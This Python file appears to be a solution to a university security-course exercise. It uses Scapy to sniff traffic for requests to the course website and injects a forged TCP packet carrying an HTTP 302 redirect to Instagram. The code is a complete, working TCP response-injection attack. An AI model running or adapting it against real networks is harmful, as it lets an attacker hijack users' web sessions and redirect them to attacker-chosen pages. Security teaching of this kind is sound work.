import q1
import scapy.all as S


RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: https://www.instagram.com',
    r'',
    r''])


WEBSITE = 'infosec.cs.tau.ac.il'


def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to instagram by sending them the
    `RESPONSE` from above.
    """
    
    # TODO: IMPLEMENT THIS FUNCTION
    
    if WEBSITE not in str(packet) or not packet.haslayer(S.IP):
        return None
    ip_dst=packet[S.IP].dst
    ip_src=packet[S.IP].src
    sport =packet[S.TCP].sport
    dport=packet[S.TCP].dport
    tcp_ack=packet[S.TCP].ack
    tcp_seq=packet[S.TCP].seq
    s=S.IP(dst=ip_src,src=ip_dst)/S.TCP(sport=dport,dport=sport,flags='PAF',seq=tcp_ack,ack=tcp_seq)/RESPONSE
    return s


def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args or len(args) > 1:
        print('Usage: %s' % args[0])
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
